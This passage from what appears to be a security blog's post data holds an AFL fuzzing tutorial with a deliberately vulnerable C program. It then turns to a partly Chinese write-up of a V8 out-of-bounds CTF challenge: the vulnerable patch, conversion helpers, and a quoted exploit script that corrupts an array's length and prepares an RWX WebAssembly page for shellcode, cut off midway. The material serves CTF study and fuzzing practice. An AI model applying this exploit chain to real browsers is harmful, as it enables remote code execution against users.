etc.\n“Superficial content” - segments where some, but not all, bitflips produce some control flow changes. Examples may include strings in rich documents (e.g., XML, RTF).\n“Critical stream” - a sequence of bytes where all bit flips alter control flow in different but correlated ways. This may be compressed data, non-atomically compared keywords or magic values, etc.\n“Suspected length field” - small, atomic integer that, when touched in any way, causes a consistent change to program control flow, suggestive of a failed length check.\n“Suspected cksum or magic int” - an integer that behaves similarly to a length field, but has a numerical value that makes the length explanation unlikely. This is suggestive of a checksum or other “magic” integer.\n“Suspected checksummed block” - a long block of data where any change always triggers the same new execution path. Likely caused by failing a checksum or a similar integrity check before any subsequent parsing takes place.\n“Magic value section” - a generic token where changes cause the type of binary behavior outlined earlier, but that doesn’t meet any of the other criteria. May be an atomically compared keyword or so.\n\n\nHow to use?The AFL approachAmerican Fuzzy Lop is a brute-force fuzzer coupled with an exceedingly simple but rock-solid instrumentation-guided genetic algorithm. It uses a modified form of edge coverage to effortlessly pick up subtle, local-scale changes to program control flow.\nSimplifying a bit, the overall algorithm can be summed up as:\n\n\nLoad user-supplied initial test cases into the queue,\nTake next input file from the queue,\nAttempt to trim the test case to the smallest size that doesn’t alter the measured behavior of the program,\nRepeatedly mutate the file using a balanced and well-researched variety of traditional fuzzing strategies,\nIf any of the generated mutations resulted in a new state transition recorded by the instrumentation, add mutated output as a new entry in the queue.\nGo to 2.\n\n\nThe discovered test cases are also periodically culled to eliminate ones that have been obsoleted by newer, higher-coverage finds; and undergo several other instrumentation-driven effort minimization steps.\nAs a side result of the fuzzing process, the tool creates a small, self-contained corpus of interesting test cases. These are extremely useful for seeding other, labor- or resource-intensive testing regimes - for example, for stress-testing browsers, office applications, graphics suites, or closed-source tools.\nThe fuzzer is thoroughly tested to deliver out-of-the-box performance far superior to blind fuzzing or coverage-only tools.\nExample 1vul.c\n#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;signal.h&gt; int vuln_3(char *str) &#123;    int len = strlen(str);    if(str[0] == &#x27;A&#x27; &amp;&amp; len == 66) &#123;        raise(SIGSEGV);    &#125;    else if(str[0] == &#x27;F&#x27; &amp;&amp; len == 6) &#123;        raise(SIGSEGV);    &#125;    else &#123;        printf(&quot;it is good!\\n&quot;);    &#125;    return 0;&#125;int main(int argc, char *argv[]) &#123;    char buf[100]=&#123;0&#125;;    gets(buf);   // vul1    printf(buf); // vul2    vuln_3(buf);    return 0;&#125;\n\nCompile source codeafl-gcc vul.c -o vul\n\nTest programafl-showmap -m none -o /dev/null -- ./vul\n\noutput:\nafl-showmap 2.57b by &lt;lcamtuf@google.com&gt;[*] Executing &#x27;./vul&#x27;...-- Program output begins --AAAAAAAAAABBBBBBBBBBBBBBBBAAAAAAAAAABBBBBBBBBBBBBBBBit is good!-- Program output ends --[+] Captured 3 tuples in &#x27;/dev/null&#x27;.\n\nTest two:\nTo trigger signal raise\n[i0gan@arch example_1]$ afl-showmap -m none -o /dev/null -- ./vulafl-showmap 2.57b by &lt;lcamtuf@google.com&gt;[*] Executing &#x27;./vul&#x27;...-- Program output begins --Faaaaa-- Program output ends --+++ Program killed by signal 11 +++[+] Captured 5 tuples in &#x27;/dev/null&#x27;.\n\nUsing different input, under normal circumstances, afl-showmap cmd will capture different tuples, which shows that our instrumentation is effective. In addition, the previously mentioned afl-cmin uses this tool to remove duplicate input files.\nClose  core patternBefore executing afl-fuzz, if the system is configured to send core dump notification to an external program. As a result, the delay between sending crash information to fuzzer will increase, and the crash may be misreported as timeout, so we have to modify the core_pattern file, run command with root user as follows:\necho core &gt;/proc/sys/kernel/core_pattern\n\nCreate a output dir\nmkdir out\n\nStarting fuzzFor target binaries that accept input directly from stdin, the usual syntax is:\nafl-fuzz -i testcase_dir -o findings_dir /path/to/program [params]\n\nSo our fuzzing cmd is\nafl-fuzz -i ./testcases/ -o out ./vul\n\nBreaking the above command into parts:\n\n-i afl_in specifies the directory to take the seed test cases from\n-o afl_out specifies the directory where AFL can store all result files for crashes, hangs and queue\n\nThe testcases dir is given by github afl project, you just copy that directory to here or run commands as follows:\nmkdir testcasescp /bin/sh ./testcases # copy random seeds to testcases\n\nMay be  comming some error\nWhoops, your system uses on-demand CPU frequency scaling, adjusted   between 1367 and 2050 MHz. Unfortunately, the scaling algorithm in the   kernel is imperfect and can miss the short-lived processes spawned by   afl-fuzz. To keep things moving, run these commands as root: \ncd /sys/devices/system/cpuecho performance | tee cpu*/cpufreq/scaling_governor\n\n\n\noutput:\n[i0gan@arch example_1]$ afl-fuzz -i ./testcases/ -o out ./vul @@afl-fuzz 2.57b by &lt;lcamtuf@google.com&gt;[+] You have 8 CPU cores and 1 runnable tasks (utilization: 12%).[+] Try parallel jobs - see /usr/share/doc/afl/parallel_fuzzing.txt.[*] Checking CPU core loadout...[+] Found a free CPU core, binding to #0.[*] Checking core_pattern...[*] Checking CPU scaling governor...[*] Setting up output directories...[+] Output directory exists but deemed OK to reuse.[*] Deleting old session data...[+] Output dir cleanup successful.[*] Scanning &#x27;./testcases/&#x27;...[+] No auto-generated dictionary tokens to reuse.[*] Creating hard links for all input files...[*] Validating target binary...[*] Attempting dry run with &#x27;id:000000,orig:README.testcases&#x27;...[*] Spinning up the fork server...[+] All right - fork server is up.    len = 828, map size = 4, exec speed = 225 us[+] All test cases processed.[+] Here are some useful stats:    Test case count : 1 favored, 0 variable, 1 total       Bitmap range : 4 to 4 bits (average: 4.00 bits)        Exec timing : 225 to 225 us (average: 225 us)[*] No -t option specified, so I&#x27;ll use exec timeout of 20 ms.[+] All set and ready to roll!\n\nMENU UI\n                         american fuzzy lop 2.57b (vul)┌─ process timing ─────────────────────────────────────┬─ overall results ─────┐│        run time : 0 days, 0 hrs, 1 min, 9 sec        │  cycles done : 172    ││   last new path : 0 days, 0 hrs, 1 min, 8 sec        │  total paths : 3      ││ last uniq crash : 0 days, 0 hrs, 0 min, 48 sec       │ uniq crashes : 4      ││  last uniq hang : none seen yet                      │   uniq hangs : 0      │├─ cycle progress ────────────────────┬─ map coverage ─┴───────────────────────┤│  now processing : 1 (33.33%)        │    map density : 0.00% / 0.01%         ││ paths timed out : 0 (0.00%)         │ count coverage : 1.00 bits/tuple       │├─ stage progress ────────────────────┼─ findings in depth ────────────────────┤│  now trying : splice 14             │ favored paths : 3 (100.00%)            ││ stage execs : 31/32 (96.88%)        │  new edges on : 3 (100.00%)            ││ total execs : 363k                  │ total crashes : 588 (4 unique)         ││  exec speed : 5736/sec              │  total tmouts : 2 (1 unique)           │├─ fuzzing strategy yields ───────────┴───────────────┬─ path geometry ────────┤│   bit flips : 0/128, 0/125, 0/119                   │    levels : 2          ││  byte flips : 0/16, 0/13, 0/7                       │   pending : 0          ││ arithmetics : 1/893, 0/220, 0/2                     │  pend fav : 0          ││  known ints : 0/82, 0/334, 0/308                    │ own finds : 2          ││  dictionary : 0/0, 0/0, 0/0                         │  imported : n/a        ││       havoc : 4/158k, 1/202k                        │ stability : 100.00%    ││        trim : 98.56%/17, 0.00%                      ├────────────────────────┘^C────────────────────────────────────────────────────┘          [cpu000: 40%]\n\nWe found 4 unique crashes just tack some seconds.\ntree out/crashesout/crashes├── id:000000,sig:06,src:000000,op:havoc,rep:128├── id:000001,sig:06,src:000002,op:havoc,rep:64├── id:000002,sig:11,src:000000+000002,op:splice,rep:32├── id:000003,sig:06,src:000001,op:havoc,rep:32└── README.txt\n\n\n\ncat out/crashes/id:000002,sig:11,src:000000+000002,op:splice,rep:32F+�Ft\n\ntest crashes\ncat out/crashes/id:000002,sig:11,src:000000+000002,op:splice,rep:32 | ./vul [1]    1213401 done                              cat out/crashes/id:000002,sig:11,src:000000+000002,op:splice,rep:32 | 1213402 segmentation fault (core dumped)  ./vul\n\n\n\nExample 2 (fuzzgat)Targetref: https://medium.com/@ayushpriya10/fuzzing-applications-with-american-fuzzy-lop-afl-54facc65d102\nmodify CC as alf-gcc\ngit clone https://github.com/fuzzstati0n/fuzzgoatcd fuzzgoatmake\n\nGet fuzzgoat vul file\nafl-command-line  fuzzgoat_ASAN  fuzzgoat.h         in           LICENSE  Makefile   seedfuzzgoat          fuzzgoat.c     fuzzgoatNoVulns.c  input-files  main.c   README.md[i0gan@arch fuzzgoat]$ ./fuzzgoat./fuzzgoat &lt;file_json\n\nCreate test_in and test_out directories\nmkdir test_in test_out\n\nCopy seed to test_in\ncp /bin/ls ./test_in\n\nBefore we start fuzz, we should set some environments. login as root, run commands as follows:\nsu - rootecho core &gt;/proc/sys/kernel/core_patterncd /sys/devices/system/cpuecho performance | tee cpu*/cpufreq/scaling_governorexit\n\nFuzzingFinally, to fuzz the application we use the following command \nafl-fuzz -i test_in -o test_out -- ./fuzzgoat @@\n\nBreaking the above command into parts:\n\n-- separates the target’s command structure. The left side of the separation is where AFL’s flags are passed and the right side is where the target’s run command is, in this case, ./fuzzgoat\n@@ defines the position where AFL is supposed to insert the test file in the target application’s command structure\n\n\nNote:* Using *@@* is not mandatory. AFL can also pass input to the target through *STDIN*.*\n\nRunning AFL should yield the following interface on your terminal:\n                      american fuzzy lop 2.57b (fuzzgoat)┌─ process timing ─────────────────────────────────────┬─ overall results ─────┐│        run time : 0 days, 0 hrs, 1 min, 5 sec        │  cycles done : 0      ││   last new path : 0 days, 0 hrs, 0 min, 0 sec        │  total paths : 165    ││ last uniq crash : 0 days, 0 hrs, 0 min, 18 sec       │ uniq crashes : 10     ││  last uniq hang : none seen yet                      │   uniq hangs : 0      │├─ cycle progress ────────────────────┬─ map coverage ─┴───────────────────────┤│  now processing : 100 (60.61%)      │    map density : 0.16% / 0.55%         ││ paths timed out : 0 (0.00%)         │ count coverage : 2.28 bits/tuple       │├─ stage progress ────────────────────┼─ findings in depth ────────────────────┤│  now trying : arith 8/8             │ favored paths : 53 (32.12%)            ││ stage execs : 243/1404 (17.31%)     │  new edges on : 74 (44.85%)            ││ total execs : 258k                  │ total crashes : 1317 (10 unique)       ││  exec speed : 4082/sec              │  total tmouts : 0 (0 unique)           │├─ fuzzing strategy yields ───────────┴───────────────┬─ path geometry ────────┤│   bit flips : 7/1064, 1/1027, 1/953                 │    levels : 4          ││  byte flips : 0/133, 0/96, 0/41                     │   pending : 129        ││ arithmetics : 15/6243, 0/983, 0/71                  │  pend fav : 22         ││  known ints : 1/621, 1/1939, 0/975                  │ own finds : 164        ││  dictionary : 0/0, 0/0, 0/0                         │  imported : n/a        ││       havoc : 146/242k, 0/0                         │ stability : 100.00%    ││        trim : 100.00%/61, 0.00%                     ├────────────────────────┘^C────────────────────────────────────────────────────┘          [cpu000: 41%]\n\nLet the fuzzer run till it has at least 50 cycles done\nAnalysing ResultsAll that’s left is looking at the results. Let’s navigate to the directory where AFL has kept all the test cases that resulted in crashes or hangs:\nLooking inside /crashes or /hangs directories should have files with names resembling (but not the same) as depicted below:\n[i0gan@arch fuzzgoat]$ tree test_out/test_out/├── crashes│   ├── id:000000,sig:06,src:000000,op:havoc,rep:8│   ├── id:000001,sig:11,src:000000,op:havoc,rep:128│   ├── id:000002,sig:06,src:000035,op:havoc,rep:4│   ├── id:000003,sig:06,src:000055,op:flip1,pos:0│   ├── id:000004,sig:06,src:000055,op:flip1,pos:2│   ├── id:000005,sig:06,src:000055,op:arith8,pos:0,val:-21│   ├── id:000006,sig:06,src:000055,op:arith8,pos:0,val:-24│   ├── id:000007,sig:06,src:000055,op:arith8,pos:0,val:-25│   ├── id:000008,sig:06,src:000055,op:arith8,pos:2,val:-21│   ├── id:000009,sig:06,src:000055,op:arith8,pos:2,val:-24│   └── README.txt├── fuzz_bitmap├── fuzzer_stats├── hangs├── plot_data└── queue    ├── id:000000,orig:sh    ├── id:000001,src:000000,op:flip1,pos:0,+cov    ├── id:000002,src:000000,op:flip1,pos:0,+cov    ├── id:000003,src:000000,op:flip1,pos:0,+cov    ├── id:000004,src:000000,op:arith8,pos:0,val:-11,+cov    ├── id:000005,src:000000,op:arith8,pos:0,val:-17,+cov    ...\n\nNow, we can take a look in these files to see what exactly AFL mutated the seed input to and then figure out why it made the application crash or hang. Finally, it’s on us what we want to do with the bugs we found with AFL.\nTest resultsTest 1./fuzzgoat test_out/crashes/id:000000,sig:06,src:000000,op:havoc,rep:8 &quot;&quot;--------------------------------string: free(): invalid pointer[1]    848244 abort (core dumped)  ./fuzzgoat test_out/crashes/id:000000,sig:06,src:000000,op:havoc,rep:8\n\nTest 2./fuzzgoat test_out/crashes/id:000009,sig:06,src:000055,op:arith8,pos:2,val:-24 &quot;&quot;--------------------------------string: free(): invalid pointer[1]    848263 abort (core dumped)  ./fuzzgoat\n\nShow file content as hex\nhexedit test_out/crashes/id:000000,sig:06,src:000000,op:havoc,rep:8 22 22hexedit test_out/crashes/id:000008,sig:06,src:000055,op:arith8,pos:2,val:-21 22 22 0D\n\n\n\nConclusionThis paper will continue to write later.\n","categories":["security"],"tags":["fuzz"]},{"title":"V8 EXPLOIT ONE","url":"/2021/03/30/security/v8-01/","content":"V8初探前言以前早就在ctf上看见过类似的v8引擎题，比如sctf，Downunder Ctf等等，这篇文章就来复现一下underdown ctf中的一个d8 pwn题，这也是个历年谷歌浏览器漏洞的一个cve，本篇参考faith的文章来学习一下v8。\nref:  https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/\n题目: 下载\n下载好之后有几个文件如下:\n[i0gan@arch Chrome]$ lsld-linux-x86-64.so.2  libc.so.6  oob.diff  Release\n\n\n\n编译 v8首先先下载谷歌的depot_tools\ngit clone https://chromium.googlesource.com/chromium/tools/depot_tools.git\n\n设置环境变量\necho &quot;export PATH=/home/i0gan/share/project/v8/tools/depot_tools:$PATH&quot; &gt;&gt; ~/.bashrc\n\n\n\n下载v8源码，这里需要翻墙下载\nfetch v8\n\n有点大，有3个多G\ncd v8./build/install-build-deps.sh #这里采用ubuntu进行执行，我采用docker下的ubuntu16来进行构建编译环境的git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598 # 切换到漏洞版本gclient syncgit apply ../Chrome/oob.diff\n\n在ubuntu16下进行编译\n编译debug版./tools/dev/v8gen.py x64.debugninja -C ./out.gn/x64.debug\n\n编译release版./tools/dev/v8gen.py x64.releaseninja -C ./out.gn/x64.release\n\n下载还有编译过程需要时间有点长，耐心等待下，这里我就编译debug版本的，编译出来的文件会放在 v8/out.gn/x64.debug/d8.\ni0gan@1ae6cc5c827a:/home/project/v8/challs/chall_1/v8/out.gn$ du -sh x64.debug/4.6G    x64.debug/\n\n\n\nPatch文件oob.diff文件如下\ndiff --git a/src/bootstrapper.cc b/src/bootstrapper.ccindex b027d36..ef1002f 100644--- a/src/bootstrapper.cc+++ b/src/bootstrapper.cc@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,                           Builtins::kArrayPrototypeCopyWithin, 2, false);     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,                           Builtins::kArrayPrototypeFill, 1, false);+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,+                          Builtins::kArrayOob,2,false);     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,                           Builtins::kArrayPrototypeFind, 1, false);     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.ccindex 8df340e..9b828ab 100644--- a/src/builtins/builtins-array.cc+++ b/src/builtins/builtins-array.cc@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,   return *final_length; &#125; &#125;  // namespace+BUILTIN(ArrayOob)&#123;+    uint32_t len = args.length();+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();+    Handle&lt;JSReceiver&gt; receiver;+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+            isolate, receiver, Object::ToObject(isolate, args.receiver()));+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());+    if(len == 1)&#123;+        //read+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));+    &#125;else&#123;+        //write+        Handle&lt;Object&gt; value;+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));+        elements.set(length,value-&gt;Number());+        return ReadOnlyRoots(isolate).undefined_value();+    &#125;+&#125;  BUILTIN(ArrayPush) &#123;   HandleScope scope(isolate);diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.hindex 0447230..f113a81 100644--- a/src/builtins/builtins-definitions.h+++ b/src/builtins/builtins-definitions.h@@ -368,6 +368,7 @@ namespace internal &#123;   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \\   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \\   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \\+  CPP(ArrayOob)                                                                \\                                                                                \\   /* ArrayBuffer */                                                            \\   /* ES #sec-arraybuffer-constructor */                                        \\diff --git a/src/compiler/typer.cc b/src/compiler/typer.ccindex ed1e4a5..c199e3a 100644--- a/src/compiler/typer.cc+++ b/src/compiler/typer.cc@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;       return Type::Receiver();     case Builtins::kArrayUnshift:       return t-&gt;cache_-&gt;kPositiveSafeInteger;+    case Builtins::kArrayOob:+      return Type::Receiver();      // ArrayBuffer functions.     case Builtins::kArrayBufferIsView:\n\n\n\n这个patch中修改了src&#x2F;bootstrapper.cc，src&#x2F;builtins&#x2F;builtins-array.cc， src&#x2F;builtins&#x2F;builtins-definitions.h，src&#x2F;compiler&#x2F;typer.cc文件，然而变动最大的就是\nsrc&#x2F;builtins&#x2F;builtins-array.cc文件，漏洞也在这个文件中，作者呢也强烈要求读者去自己尝试把漏洞标记出来，下面注释就是我做的一些解释，如下\n@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,   return *final_length; &#125; &#125;  // namespace // 漏洞patch+BUILTIN(ArrayOob)&#123;+    uint32_t len = args.length();+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value(); // 如果参数大于2，返回undefined+    Handle&lt;JSReceiver&gt; receiver;+    // 执行一下的就要满足 len &lt;= 1，所以只剩下一个arg传入进来+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+            isolate, receiver, Object::ToObject(isolate, args.receiver()));+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver); //获取array+    //将array元素强制转换为FixedDoubleArray+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number()); // 再获取数组的长度+    if(len == 1)&#123;+        //read+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));+    &#125;else&#123; //如果len &lt;= 0 +        //write+        Handle&lt;Object&gt; value;+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));+        elements.set(length,value-&gt;Number()); // 设置长度为 atgs.at&lt;Object&gt;(1) 的int值，漏洞点，若能控制atgs.at&lt;Object&gt;(1)，就可以达到数组越界+        return ReadOnlyRoots(isolate).undefined_value();+    &#125;+&#125;\n\n下面贴下作者的原话:\nI urge the reader to take a look at the code added to src/builtins/builtins-array.cc and try to spot the vulnerability. Even without any further context, it should be easy to spot.\n\nThe function will initially check if the number of arguments is greater than 2 (the first argument is always the this argument). If it is, it returns undefined.\nIf there is only one argument (this), it will cast the array into a FixedDoubleArray before returning the element at array[length].\nIf there are two arguments (this and value), it will write value as a float into array[length].\n\nNow, since arrays start with index 0, it is evident that array[length] results in an out-of-bounds access by one index at the end of the array.\n那么按照作者介绍js中的三种类型，v8采用一种pointer taggin的机制去分辨pointer，double还有smis类型，都代表一种快速小的整数，这些信息可以在src&#x2F;objects.h中找到。三种类型分别分别定义如下:\n* Double: Shown as the 64-bit binary representation without any changes\n* Smi: Represented as value &lt;&lt; 32, i.e 0xdeadbeef is represented as 0xdeadbeef00000000\n* Pointers: Represented as addr &amp; 1. 0x2233ad9c2ed8 is represented as 0x2233ad9c2ed9\n\n还有一 注意的是，v8泄漏任何信息都以浮点数进行打印，也没有任何方式去正常表达64位的整型变量，所以的采用js的某些特殊手段将内存中的float类型以16进制方式打印出来，下面是作者提供的转换函数。\n/// Helper functions to convert between float and integer primitivesvar buf = new ArrayBuffer(8); // 8 byte array buffervar f64_buf = new Float64Array(buf);var u64_buf = new Uint32Array(buf);function ftoi(val) &#123; // typeof(val) = float    f64_buf[0] = val;    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) &lt;&lt; 32n); // Watch for little endianness&#125;function itof(val) &#123; // typeof(val) = BigInt    u64_buf[0] = Number(val &amp; 0xffffffffn);    u64_buf[1] = Number(val &gt;&gt; 32n);    return f64_buf[0];&#125;\n\nftoi: 将浮点类型转换为BigInt类型，用于泄漏内存\nitof: 将BigInt类型转换为浮点类型，用于写入到内存，因为d8都是采用浮点类型进行储存的，采用一定转换后的格式才能正确在内存中写入值。\n将上面保存为file.js\n可以运行d8如下去执行，可以通过脚本实现转换。\n./d8 --shell ./file.js\n\n\n\n输出\nV8 version 7.5.0 (candidate)d8&gt; ftoi(1234)4653142004841054208nd8&gt; itof(4653142004841054208n)1234\n\n\n\n数组末尾储存的是什么？可以通过到谷歌官方source code https://source.chromium.org 查看源代码，但是不推荐，除非要有深刻的理解v8的代码才能知道内存的布局是什么。有另一种方法可以去知道内存布局。\n通过debug版本的d8，可以实时的打印数组的内存布局，执行命令如下:\n./d8 --allow-natives-syntax\n\n若想进入到某些调试函数的话，可以采用%DebugPrint()\n采用gdb调试效果如下:\ngdb ./d8pwndbg&gt; run --allow-natives-syntaxStarting program: /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/d8 --allow-natives-syntaxwarning: Error disabling address space randomization: Operation not permitted[Thread debugging using libthread_db enabled]Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.[New Thread 0x7f9e54b5a700 (LWP 52)][New Thread 0x7f9e54359700 (LWP 53)][New Thread 0x7f9e53b58700 (LWP 54)][New Thread 0x7f9e53357700 (LWP 55)][New Thread 0x7f9e52b56700 (LWP 56)][New Thread 0x7f9e52355700 (LWP 57)][New Thread 0x7f9e51b54700 (LWP 58)]V8 version 7.5.0 (candidate)d8&gt; var a = [1.1, 2.2]; //定义触发漏洞的数组undefinedd8&gt; %DebugPrint(a);DebugPrint: 0x103bc188dd79: [JSArray] - map: 0x206bc6402ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties] - prototype: 0x0c7064ed1111 &lt;JSArray[0]&gt; - elements: 0x103bc188dd59 &lt;FixedDoubleArray[2]&gt; [PACKED_DOUBLE_ELEMENTS] - length: 2 - properties: 0x305fab880c71 &lt;FixedArray[0]&gt; &#123;    #length: 0x2108dfb001a9 &lt;AccessorInfo&gt; (const accessor descriptor) &#125; - elements: 0x103bc188dd59 &lt;FixedDoubleArray[2]&gt; &#123;           0: 1.1           1: 2.2 &#125;0x206bc6402ed9: [Map] - type: JS_ARRAY_TYPE - instance size: 32 - inobject properties: 0 - elements kind: PACKED_DOUBLE_ELEMENTS - unused property fields: 0 - enum length: invalid - back pointer: 0x206bc6402e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; - prototype_validity cell: 0x2108dfb00609 &lt;Cell value= 1&gt; - instance descriptors #1: 0x0c7064ed1f49 &lt;DescriptorArray[1]&gt; - layout descriptor: (nil) - transitions #1: 0x0c7064ed1eb9 &lt;TransitionArray[4]&gt;Transition array #1:     0x305fab884ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x206bc6402f29 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt; - prototype: 0x0c7064ed1111 &lt;JSArray[0]&gt; - constructor: 0x0c7064ed0ec1 &lt;JSFunction Array (sfi = 0x2108dfb0aca1)&gt; - dependent code: 0x305fab8802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt; - construction counter: 0[1.1, 2.2]d8&gt;\n\n然而发现上面创建了4个线程，不方便调试通过设置UV_THREADPOOL_SIZE环境变量来改d8启动的线程数\nUV_THREADPOOL_SIZE=1\n\n尝试了，不行。\n在调用数组oob()函数的时候崩溃。。。Arch linux与Ubuntu执行效果一样，出现了内存错误。。。\nd8&gt; a.oob()## Fatal error in ../../src/objects/fixed-array-inl.h, line 321# Debug check failed: index &gt;= 0 &amp;&amp; index &lt; this-&gt;length().####FailureMessage Object: 0x7ffc874a2430==== C stack trace ===============================    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x21) [0x7f4f5960bcd1]    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8_libplatform.so(+0x3fbb7) [0x7f4f595a4bb7]    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x218) [0x7f4f595f7438]    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8_libbase.so(+0x35e7c) [0x7f4f595f6e7c]    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x27) [0x7f4f595f7507]    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8.so(v8::internal::FixedDoubleArray::get_scalar(int)+0x15d) [0x7f4f5797ed2d]    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8.so(+0x14fdf27) [0x7f4f57973f27]    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8.so(v8::internal::Builtin_ArrayOob(int, unsigned long*, v8::internal::Isolate*)+0xed) [0x7f4f57973b8d]    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8.so(+0x2a5a0c0) [0x7f4f58ed00c0]Received signal 4 ILL_ILLOPN 7f4f59609271Illegal instruction (core dumped)\n\n\n\n\n\n\n\n\n\nDownunder ctf [is-this-pwn-or-web]查看diff文件与之前一样，下面为作者具体利用思路。\n更新中…\nexp/* This challenge is meant to be extremely hard. The way this exploit goes is * essentially as follows: * * Step 1: Read the patch.diff file to figure out the vulnerability * * Step 2: Use the vulnerability to get a corrupted float array. You can use *         this array to overwrite its own length to a very large number * * Step 3: Once you&#x27;ve done this, exploitation becomes (relatively) easy. There *         are loads of blog posts and other V8 exploits that you can use as *         a starting point. I&#x27;ll list some below. The only issue will be that *         V8 somewhat recently started shipping with pointer compression, and *         most blog posts / exploits will be made for challenges / vulns from *         V8 versions without pointer compression. * * https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/ * https://blog.exodusintel.com/2019/09/09/patch-gapping-chrome/ * https://tcode2k16.github.io/blog/posts/2020-03-15-confidence-ctf/#chromatic-aberration * https://blog.hexrabbit.io/2020/03/16/chromatic-aberration-writeup/ (use google translate) * https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/ (very old) * * If you still have questions regarding this challenge, feel free to DM me  * anywhere. I&#x27;ll do my best to respond to queries! * * Discord: Faith#2563 * Twitter: @farazsth98 */// Helper functions setup to convert between doubles and numbers when neededvar buf = new ArrayBuffer(8);var f64_buf = new Float64Array(buf);var u32_buf = new Uint32Array(buf);function ftoi(val) &#123; // typeof(val) == float    f64_buf[0] = val;    return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) &lt;&lt; 32n); // Watch for little endianness&#125;function itof(val) &#123; // typeof(val) == BigInt    u32_buf[0] = Number(val &amp; 0xffffffffn);    u32_buf[1] = Number(val &gt;&gt; 32n);    return f64_buf[0];&#125;function hex(val) &#123; // typeof(val) == BigInt    return &quot;0x&quot; + val.toString(16);&#125;// We set up a web assembly page. This is mapped as an RWX page that we will// later write shellcode into.var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);var wasm_mod = new WebAssembly.Module(wasm_code);var wasm_instance = new WebAssembly.Instance(wasm_mod);var f = wasm_instance.exports.main;console.log(&quot;[+] WebAssembly RWX page setup!&quot;);// Next, set up three arrays. These will be allocated one after another because// of the deterministic nature of the V8 heap. We corrupt the float array.// You can find their offsets relative to each other using GDB.//// While we do this, we also trigger the vulnerability to get a corrupted// float array in `float_arr`var float_arr = [1.1];float_arr = float_arr.slice(0); // Trigger the vulnvar addrof_arr = [&#123;&#125;, &#123;&#125;]; // Used for the addrof primitive latervar arb_read_arr = [1.1]; // Used for the arbitrary read primitive later// We set up an ArrayBuffer and a DataView. We will use these later to write // our shellcode into the RWX page.var buf = new ArrayBuffer(0x100);var dataview = new DataView(buf);console.log(&quot;[+] Corrupting float_arr&#x27;s length to 2048&quot;);// We need to store the current `elements` ptr before we corrupt the length// because corrupting the length also requires us to corrupt the `elements` ptr// in the processvar float_arr_elem = ftoi(float_arr[2]) &amp; 0xffffffffn;// Corrupt the length and keep the `elements` ptr intactfloat_arr[2] = itof((0x1000n &lt;&lt; 32n) + float_arr_elem);if (float_arr.length === 2048) &#123;  console.log(&quot;[+] Corruption successful!&quot;);&#125; else &#123;  